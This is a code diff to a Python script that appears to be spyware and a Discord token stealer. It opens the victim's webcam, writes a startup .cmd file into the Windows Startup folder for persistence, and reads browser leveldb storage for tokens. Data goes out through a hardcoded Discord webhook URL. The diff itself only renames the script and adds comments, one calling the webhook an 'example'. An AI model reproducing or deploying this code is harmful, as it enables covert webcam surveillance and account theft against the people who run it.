@@ -7,8 +7,8 @@ import os
 import socket
 import sys, re
 
-url = "https://canary.discord.com/api/webhooks/959713244933677116/ZshGunP-yLu_VDTh5tz85tMGSVfySdTm1PlUhX8WHdPDoMOoZv9WUTJR8KatqzGr8Msk"
-webhook = discord.Webhook.from_url(url, adapter=discord.RequestsWebhookAdapter()) # Your webhook
+url = "https://canary.discord.com/api/webhooks/959713244933677116/ZshGunP-yLu_VDTh5tz85tMGSVfySdTm1PlUhX8WHdPDoMOoZv9WUTJR8KatqzGr8Msk" # example webhook link
+webhook = discord.Webhook.from_url(url, adapter=discord.RequestsWebhookAdapter())
 cap = cv.VideoCapture(0)
 cap.set(CAP_PROP_BACKLIGHT, 0)
 cap.set(412, 1)
@@ -18,7 +18,7 @@ if not cap.isOpened():
 count = 0
 path = fr"C:\Users\{os.environ['USERNAME']}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run_script.cmd"
 f = open(path, "w")
-f.write(f"python {os.path.dirname(os.path.realpath(sys.argv[0]))}\ilikecock.py")
+f.write(f"python {os.path.dirname(os.path.realpath(sys.argv[0]))}\\buddy.py") # IF THE FILE NAME IS CHANGED, IT NEEDS TO BE CHANGED HERE TOO
 f.close()
 def find_tokens(path):
     path += r'\Local Storage\leveldb'
